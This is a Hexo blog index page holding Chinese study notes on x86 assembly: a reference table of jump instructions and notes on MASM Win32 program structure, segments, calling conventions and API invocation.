<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Kopieren',
      copy_success: 'Kopiert',
      copy_failure: 'Kopieren fehlgeschlagen'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Resit much,Obey little">
<meta property="og:type" content="website">
<meta property="og:title" content="ZERO-A-ONE">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="Resit much,Obey little">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZERO-A-ONE">
<meta name="twitter:description" content="Resit much,Obey little">
  <link rel="canonical" href="http://yoursite.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Suche..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            
  <div id="posts" class="posts-expand">
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/27/╗π▒α╠°╫¬╓╕┴ε╗π╫▄/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/27/╗π▒α╠°╫¬╓╕┴ε╗π╫▄/" class="post-title-link" itemprop="url">汇编跳转指令汇总</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-27 00:53:10 / Geändert am: 16:53:40" itemprop="dateCreated datePublished" datetime="2020-02-27T00:53:10-08:00">2020-02-27</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="无条件跳转"><a href="#无条件跳转" class="headerlink" title="无条件跳转"></a>无条件跳转</h2><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">条件</th>
</tr>
</thead>
<tbody><tr>
<td align="center">JMP</td>
<td align="center">无条件跳转</td>
</tr>
</tbody></table>
<h2 id="根据CX、ECX寄存器的值跳转"><a href="#根据CX、ECX寄存器的值跳转" class="headerlink" title="根据CX、ECX寄存器的值跳转"></a>根据CX、ECX寄存器的值跳转</h2><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">条件</th>
</tr>
</thead>
<tbody><tr>
<td align="center">JCXZ</td>
<td align="center">CX为0则跳转</td>
</tr>
<tr>
<td align="center">JECXZ</td>
<td align="center">ECX为0则跳转</td>
</tr>
</tbody></table>
<h2 id="根据标志位跳转的指令"><a href="#根据标志位跳转的指令" class="headerlink" title="根据标志位跳转的指令"></a>根据标志位跳转的指令</h2><h3 id="无符号数"><a href="#无符号数" class="headerlink" title="无符号数"></a>无符号数</h3><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">条件</th>
</tr>
</thead>
<tbody><tr>
<td align="center">JA</td>
<td align="center">无符号大于则跳转</td>
</tr>
<tr>
<td align="center">JNA</td>
<td align="center">无符号不大于则跳转</td>
</tr>
<tr>
<td align="center">JAE</td>
<td align="center">无符号大于等于则跳转，同JNB</td>
</tr>
<tr>
<td align="center">JNAE</td>
<td align="center">无符号不大于等于则跳转，同JB</td>
</tr>
<tr>
<td align="center">JB</td>
<td align="center">无符号小于则跳转</td>
</tr>
<tr>
<td align="center">JNB</td>
<td align="center">无符号不小于则跳转</td>
</tr>
<tr>
<td align="center">JBE</td>
<td align="center">无符号小于等于则跳转，同JNA</td>
</tr>
<tr>
<td align="center">JNBE</td>
<td align="center">无符号不小于等于则跳转，同JA</td>
</tr>
</tbody></table>
<h3 id="有符号数"><a href="#有符号数" class="headerlink" title="有符号数"></a>有符号数</h3><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">条件</th>
</tr>
</thead>
<tbody><tr>
<td align="center">JG</td>
<td align="center">有符号大于则跳转</td>
</tr>
<tr>
<td align="center">JNG</td>
<td align="center">有符号不大于则跳转</td>
</tr>
<tr>
<td align="center">JGE</td>
<td align="center">有符号大于等于则跳转，同JNL</td>
</tr>
<tr>
<td align="center">JNGE</td>
<td align="center">有符号不大于等于则跳转，同JL</td>
</tr>
<tr>
<td align="center">JL</td>
<td align="center">有符号小于则跳转</td>
</tr>
<tr>
<td align="center">JNL</td>
<td align="center">有符号不小于则跳转</td>
</tr>
<tr>
<td align="center">JLE</td>
<td align="center">有符号小于等于则跳转，同JNG</td>
</tr>
<tr>
<td align="center">JNLE</td>
<td align="center">有符号不小于等于则跳转，同JG</td>
</tr>
</tbody></table>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">条件</th>
</tr>
</thead>
<tbody><tr>
<td align="center">JE</td>
<td align="center">等于则跳转，同JZ</td>
</tr>
<tr>
<td align="center">JNE</td>
<td align="center">不等于则跳转，同JNZ</td>
</tr>
<tr>
<td align="center">JZ</td>
<td align="center">为零则跳转</td>
</tr>
<tr>
<td align="center">JNZ</td>
<td align="center">不为零则跳转</td>
</tr>
<tr>
<td align="center">JS</td>
<td align="center">为负则跳转</td>
</tr>
<tr>
<td align="center">JNS</td>
<td align="center">不为负则跳转</td>
</tr>
<tr>
<td align="center">JC</td>
<td align="center">进位则跳转</td>
</tr>
<tr>
<td align="center">JNC</td>
<td align="center">不进位则跳转</td>
</tr>
<tr>
<td align="center">JO</td>
<td align="center">溢出则跳转</td>
</tr>
<tr>
<td align="center">JNO</td>
<td align="center">不溢出则跳转</td>
</tr>
<tr>
<td align="center">JP</td>
<td align="center">为偶则跳转</td>
</tr>
<tr>
<td align="center">JNP</td>
<td align="center">不为偶则跳转</td>
</tr>
<tr>
<td align="center">JPE</td>
<td align="center">奇偶位置位则跳转，同JP</td>
</tr>
<tr>
<td align="center">JPO</td>
<td align="center">奇偶位复位则跳转，同JNP</td>
</tr>
</tbody></table>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/27/80x86╗π▒α▒╩╝╟02/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/27/80x86╗π▒α▒╩╝╟02/" class="post-title-link" itemprop="url">80x86汇编笔记02</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-27 00:41:04 / Geändert am: 16:41:20" itemprop="dateCreated datePublished" datetime="2020-02-27T00:41:04-08:00">2020-02-27</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="模式定义"><a href="#模式定义" class="headerlink" title="模式定义"></a>模式定义</h2><h3 id="指定使用的指令集"><a href="#指定使用的指令集" class="headerlink" title="指定使用的指令集"></a>指定使用的指令集</h3><p>.386语句是汇编语句的伪指令，类似的指令还有：.8086、.186、.286、.386/386p、.486/486p和.586/586p等，用于告诉编译器在本程序中使用的指令集</p>
<p>在DOS的汇编中默认使用的是8086指令集，Win32环境工作在80386及以上的处理器中，所以需要指定指令集</p>
<p>另外，后面带p的伪指令则表示程序中可以在使用特权指令，这一类特权指令必须在特权级0上运行</p>
<h3 id="model语句"><a href="#model语句" class="headerlink" title="model语句"></a>model语句</h3><p>.model语句在低版本的宏汇编中已经存在，用来定义程序工作的模式，它的使用方法是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.model 内存模式 [语言模式][其他模式]</span><br></pre></td></tr></table></figure>

<h4 id="内存模式"><a href="#内存模式" class="headerlink" title="内存模式"></a>内存模式</h4><table>
<thead>
<tr>
<th align="center">模式</th>
<th align="center">内存使用方式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">tiny</td>
<td align="center">用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内</td>
</tr>
<tr>
<td align="center">small</td>
<td align="center">建立代码和数据分别用一个64KB段的.exe文件</td>
</tr>
<tr>
<td align="center">medium</td>
<td align="center">代码段可以有多个64KB段，数据段只有个64KB段</td>
</tr>
<tr>
<td align="center">compact</td>
<td align="center">代码段只有一个64KB，数据段可以有多个64KB段</td>
</tr>
<tr>
<td align="center">large</td>
<td align="center">代码段和数据段都可以有多个64KB段</td>
</tr>
<tr>
<td align="center">huge</td>
<td align="center">同large，并且数据段中的一个数组也可以超过64KB</td>
</tr>
<tr>
<td align="center">flat</td>
<td align="center">WIn32程序使用的模式，代码和数据段使用同一个4GB段</td>
</tr>
</tbody></table>
<p>对于Win32程序来说，只有一种内存模式，即flat(平坦模式)，意思是内存是很平坦的从0延伸到4GB，再没有64KB段大小限制。因为4GB空间用32位的寄存器全部都能访问到，不必在头脑中随时记着当前使用的是哪个数据段。</p>
<p>如果定义了<code>.model flat</code>，MASM自动为各种段寄存器做了如下定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASSUME cs:FLAT,ds:FLAT,ss:FLAT,es:FLAT,fs:ERROR,gs:ERROR</span><br></pre></td></tr></table></figure>

<p>也就是说，CS、DS、SS和ES段全部使用平坦模式。FS和GS寄存器默认不使用，但如果要使用需要声明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assume fs:nothing,gs:nothing ；或者</span><br><span class="line">assume fs:FLAT,gs:FLAT</span><br></pre></td></tr></table></figure>

<h4 id="语言模式"><a href="#语言模式" class="headerlink" title="语言模式"></a>语言模式</h4><p>在Win32汇编中，model语句还指定语言模式，即子程序和调用方式。一般使用的是stdcall，它指出了调用子程序或Win32 API时参数传递的次序和堆栈平衡的方法</p>
<p>还有C，SysCall，BASIC，FORTAN和PASCALL</p>
<p>因为Windows的API调用使用的是stdcall格式，所以在Win32汇编中没有选择，必须在.model中加上stdcall参数</p>
<h5 id="stdcall调用"><a href="#stdcall调用" class="headerlink" title="_stdcall调用"></a>_stdcall调用</h5><p>一般是Pascal程序的缺省调用方式。参数采用从右到左的压栈方式，被调函数自身在返回前清空堆栈</p>
<h5 id="cdecl调用"><a href="#cdecl调用" class="headerlink" title="_cdecl调用"></a>_cdecl调用</h5><p>一般是C/C++程序的缺省调用方式。参数采用从右到左的压栈方式，传送参数的内存栈由调用者维护。cdecl约定的函数只能被C/C++调用，每一个调用它的函数都包含清空堆栈的代码，所以产生的可执行文件大小会比调用stdcall函数的大</p>
<h3 id="option语句"><a href="#option语句" class="headerlink" title="option语句"></a>option语句</h3><p>如<code>option casemap:none</code>的意义是告诉编译器程序中的变量名和子程序名是否对大小写敏感。由于Win32 API的API函数名称本质是区分大小写的，所以必须指定这个选项，否则调用API函数就会出现问题</p>
<h2 id="段的定义"><a href="#段的定义" class="headerlink" title="段的定义"></a>段的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line">&lt;一些include语句&gt;</span><br><span class="line">.stack [堆栈段的大小]</span><br><span class="line">.data</span><br><span class="line">&lt;一些初始化过的变量定义&gt;</span><br><span class="line">.data?</span><br><span class="line">&lt;一些没有初始化过的变量定义&gt;</span><br><span class="line">.const</span><br><span class="line">&lt;一些常量定义&gt;</span><br><span class="line">.code</span><br><span class="line">	&lt;代码&gt;</span><br><span class="line">	&lt;开始标号&gt;</span><br><span class="line">		&lt;其他语句&gt;</span><br><span class="line">end 开始标号</span><br></pre></td></tr></table></figure>

<p>stack、data、data？、const和code都是分段伪指令，Win32中实际上只有代码和数据之分</p>
<p>data、data？和const这些都是指向数据段，code是指向代码段</p>
<p>和DOS汇编不同，Win32汇编不必考虑堆栈，系统会为程序分配一个向下的拓展的、足够大的段作为堆栈段，所以stack段定义常常被忽略</p>
<h2 id="Win32和DOS的不同"><a href="#Win32和DOS的不同" class="headerlink" title="Win32和DOS的不同"></a>Win32和DOS的不同</h2><p>所以Win32中段，实际上并不是DOS汇编中那种意义的段，而是内存的“分段”。上一个段的结束就是下一个段的开始，所有的分段，合起来，包括系统使用的地址空间，就组成了整个可以寻址的4GB空间</p>
<p>Win32汇编的内存管理使用了80386处理器的分页机制，每个页(4KB大小)可以自由指定属性，所以上一个4KB可能是代码，属性是可执行但不可写，下一个4KB就有可能是既可读也可写但不可执行的数据</p>
<p>Win32汇编程序中“分段”的概念实际上是把不同类型的数据或代码归类，再放到不同属性的内存页（也就是不同的“分段”）中，这中间不涉及使用不同的段选择器</p>
<h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>data、data？和const定义的是数据段，分别对应不同方式的数据定义，在最后生成的可执行文件中也分别放在不同的节区(Section)中</p>
<p>程序中的数据定义一段可以归纳为3类：</p>
<ul>
<li>可读可写的已定义变量<ul>
<li>这些数据在源程序中已经被定义了初始值，而且在程序的执行中有可能被更改</li>
<li>.data段是已初始化数据段，其中定义的数据是可读可写的，在程序装入完成的时候，这些值就已经在内存中，data段存放在可执行文件的_DATA节区内</li>
</ul>
</li>
<li>可读可写的未定义变量<ul>
<li>这些变量一般是当做缓冲区或者在程序执行后才开始使用的，这些数据可以定义在.data段中，也可以定义在.data?段中，但一般把它放到.data?段中</li>
<li>虽然定义在这两种段中都可以正常使用，但定义在.data?段中不会增大.exe文件的大小</li>
<li>举例说明，如果要用到一个100KB的缓冲区，可以在数据段中定义<ul>
<li><code>szBuffer    db    100*1024 dup(?)</code></li>
<li>如果放在.data段中，编译器认为这些数据在程序装入时必须有效，所以它在生成可执行文件的时候保留了所有的100KB内容</li>
<li>如果放在.data?段中，其中的内容编译器会认为程序在开始执行后才会用到，所以它在生成可执行文件的时候只保留了大小信息，不会浪费磁盘空间</li>
</ul>
</li>
</ul>
</li>
<li>常量<ul>
<li>这些数据放在.const段中，它是可读不可写的</li>
<li>一般为了方便起见，在小程序中常常把常量一起定义到data段中，而不另外定义一个const段</li>
<li>如果想要写入const段中的数据，会引起保护错误</li>
</ul>
</li>
</ul>
<h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><p>code段是代码段，所有的指令都必须写在代码段中，在可执行文件中，代码段是放在_TEXT节区中的。Win32环境中的数据段是不可执行的，只有代码段有可执行的属性。对于工作在特权级3的应用程序来说，code段是不可写的</p>
<p>在Windows95下，在特权级0下运行的程序对所有的段都有读写的权利，包括代码段。另外，在优先级3下与运行的程序也不是一定不能写代码段，代码段的属性是由可执行文件PE头部中的属性位决定的。通过编辑磁盘上的exe文件，把代码段属性位改成可写，那么在程序中就允许修改自己的代码段</p>
<blockquote>
<p>一些典型的应用就是一些针对可执行文件的压缩软件和加壳软件，如UPX和PeCompact等</p>
<p>这些软件靠把代码段进行变换来达到解压缩和解密的目的，被处理过的可执行文件在执行时需要由解压代码来将代码段解压缩，这就需要写代码段，所以这些软件对可执行文件代码段的属性预先做修改</p>
</blockquote>
<h2 id="程序结束和程序入口"><a href="#程序结束和程序入口" class="headerlink" title="程序结束和程序入口"></a>程序结束和程序入口</h2><p>在汇编程序中，并没有一个main函数，程序员可以指定从代码段的任何一个地方开始执行，这个地方由程序最后一句的end语句来指定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">end [开始地址]</span><br></pre></td></tr></table></figure>

<p>这句语句同时表示源程序结束，所有的代码必须在end语句之前。但是，一个源程序不必非要指定入口标号，这时候可以把开始地址忽略不写，这种情况发生在编写多模块程序的单个模块的时候</p>
<p>当分开写多个程序模块时，每个模块的源程序中也可以包括data、data？、const和code段，只是其他模块最后的end语句必须不带开始地址</p>
<p>当最后多个模块链接在一起的时候，只能由一个主模块指定入口地址，在多个模块中指定入口地址或者没有一个模块指定了入口地址，链接程序都会报错</p>
<h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>当源程序的某一行过长，不利于阅读的时候，可以分行书写，分行的办法是在一行的最后用反斜杠(\)做换行符</p>
<h2 id="调用API函数"><a href="#调用API函数" class="headerlink" title="调用API函数"></a>调用API函数</h2><blockquote>
<h4 id="Win32程序是构筑在Win32-API基础上的。在Win32-API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数"><a href="#Win32程序是构筑在Win32-API基础上的。在Win32-API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数" class="headerlink" title="Win32程序是构筑在Win32 API基础上的。在Win32 API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数"></a>Win32程序是构筑在Win32 API基础上的。在Win32 API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数</h4></blockquote>
<p>程序调用系统功能的一般过程：首先，系统提供功能模块并约定参数的定义方法，同时约定调用的方式，同时约定调用的方式，应用程序按照这个约定来调用系统功能</p>
<p>在DOS常用系统中断来实现调用。与DOS中断相比，Win32的系统功能模块放在Windows的动态链接库(DLL中)</p>
<blockquote>
<p>DLL是一种Windows的可执行文件，采用的是和我们熟悉的exe文件同样的PE约定格式，装着各种系统的API函数。实际上，Win32的基础就是由DLL组成的。Win32 API的核心由3个DLL提供，它们是：</p>
<ul>
<li>KERNEL32.DLL：系统服务功能，包括内存管理、任务管理和动态链接等</li>
<li>GDI32.DLL：图形设备接口，处理图形绘制</li>
<li>USER32.DLL：用户接口服务，建立窗口和传送消息</li>
</ul>
<p>还有其他的不同DLL，例如使用TCP/IP协议进行网络通信的DLL是Wsock32.dll，它所提供的API称为Socker API；专用于电话服务方面的API称为TAPI（Telephony API），包含在Tapi32.dll中</p>
</blockquote>
<h2 id="API函数的参数"><a href="#API函数的参数" class="headerlink" title="API函数的参数"></a>API函数的参数</h2><p>DOS下通过中断来调用系统“函数”，其中的“参数”是通过放在寄存器中</p>
<p>Win32 API是用堆栈来传递参数的，调用者把参数一个个压入堆栈，DLL中的函数程序再从堆栈中取出参数处理，并在返回之前将堆栈中已经无用的参数丢弃。在《Microsoft Win32 Programmer’s Reference》中定义了常用API的参数和函数声明</p>
<p>Win32环境中的参数实际上只有一种类型，那就是一个32位的整数，实际上就是汇编中的dword（double word、dd、双字型、4个字节、两个字、32位）</p>
<p>Windows所有编程资料发布的格式也是C格式</p>
<p>例子，在汇编中调用MessageBox函数的方法是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push uType</span><br><span class="line">push lpCaption</span><br><span class="line">push lpText</span><br><span class="line">push hWnd</span><br><span class="line">call MessageBox</span><br></pre></td></tr></table></figure>

<p>在源程序编译链接成可执行文件后，call MessageBox语句中的MessageBox会被换成一个地址，指向可执行文件中的导入表的一个索引（函数名或索引号）</p>
<p>导入表中指向MessageBox函数的实际地址会在程序装入内存的时候，根据User32.dll在内存中的位置由系统动态填入</p>
<h2 id="使用invoke语句"><a href="#使用invoke语句" class="headerlink" title="使用invoke语句"></a>使用invoke语句</h2><p>API是可以调用了，另一个麻烦的问题是Win32的API动辄就是十几个参数，整个源程序一眼看上去基本上都是把参数压堆栈的push指令，参数的个数和顺序很容易搞错，源程序可读性差</p>
<p>微软在MASM中提供了一个伪指令实现了一句中打入所有的参数，并在参数使用错误的时候能够提示，那就是invoke伪指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke 函数名 [参数1][参数2]...[参数n]</span><br></pre></td></tr></table></figure>

<p>例如调用MessageBox函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke MessageBox,NULL,offsetszText,offset szCaption,MB_OK</span><br></pre></td></tr></table></figure>

<blockquote>
<p>invoke并不是80386处理器的指令，而是一个MASM编译器的伪指令，在编译的时候它把上面的指令展开成我们需要的4个push指令和一个call指令，同时进行参数数量的检查工作</p>
</blockquote>
<p>对于不带参数的API调用，invoke伪指令的参数检查功能可有可无，既可以用call也可以用invoke</p>
<h2 id="API函数的返回值"><a href="#API函数的返回值" class="headerlink" title="API函数的返回值"></a>API函数的返回值</h2><p>返回值的类型对于汇编程序来说也只有dword一种类型，它永远放在eax中</p>
<p>如果要返回的内容不是一个eax所能容纳的，Win32 API采用的方式一般是返回一个指针，或者在调用参数中提供一个缓冲区地址，干脆把数据直接返回到缓冲区中去</p>
<h2 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h2><p>在调用API函数的时候，函数原型也必须预先声明，声明函数的格式是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名	proto	[距离][语言][参数1]:数据类型,[参数2]:数据类型</span><br></pre></td></tr></table></figure>

<p><code>proto</code>是函数声明的伪指令，距离可以是NEAR、FAR、NEAR16、NEAR32、FAR16或FAR32，Win32中只有一个平坦的段，无所谓距离，所以在定义的时候忽略的</p>
<p>对于Win32汇编来说只存在dword类型的参数，所以所有的参数类型永远都是dword，另外对于参数的名称其实是无用的，仅为了可读性，所以下面两句消息框函数的定义是一致的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBox Proto hWnd:dword,lpText:dword,lpCation:dword,uType:dword</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBox	Proto :dword,:dword,:dword,:doword</span><br></pre></td></tr></table></figure>

<p>在Win32环境中，和字符串相关的API共有两类，分别对应两个字符集：一类是处理ANSI字符集(1B)的，另一类是处理Unicode字符集(2B)的。前一类函数名字的尾部带一个A字符，另一种则带一个W字符</p>
<h2 id="include语句"><a href="#include语句" class="headerlink" title="include语句"></a>include语句</h2><p>在MASM32工具包中已经包括了所有DLL的API函数声明列表，每个DLL对应.inc文件，在源程序中只要使用include包含进来就可以了，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include user32.inc</span><br><span class="line">include kernel32,inc</span><br></pre></td></tr></table></figure>

<h2 id="includelib语句"><a href="#includelib语句" class="headerlink" title="includelib语句"></a>includelib语句</h2><p>一个DLL文件对应一个导入库，如User32.dll文件用于编程的导入库是User32.lib，MASM32工具包中包含了所有DLL的导入库</p>
<p>和inlcude语句的处理不同，includelib不会吧.lib文件插入到源程序中，它只是告诉连接器在链接的时候到指定的库文件中去找而已。DLL文件中的函数没有包括声明，所以才需要将.inc文件插进去</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/25/80x86╗π▒α▒╩╝╟01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/25/80x86╗π▒α▒╩╝╟01/" class="post-title-link" itemprop="url">80x86汇编笔记01</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-25 16:58:14" itemprop="dateCreated datePublished" datetime="2020-02-25T16:58:14-08:00">2020-02-25</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
